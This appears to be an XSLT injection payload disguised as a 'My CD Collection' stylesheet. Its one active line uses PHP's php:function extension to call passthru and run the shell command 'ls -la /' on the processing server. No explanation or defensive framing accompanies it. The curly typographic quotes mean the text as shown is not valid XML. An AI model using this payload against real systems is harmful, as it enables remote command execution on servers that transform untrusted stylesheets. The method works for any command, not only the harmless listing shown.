<?xml version="1.0"?>
<xsl:stylesheet version=”1.0″ xmlns:xsl=”http://www.w3.org/1999/XSL/Transform” xmlns:php=”http://php.net/xsl”>
  <xsl:template match=”/”>
    <html>
      <body>
        <h2>My CD Collection</h2>
        <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
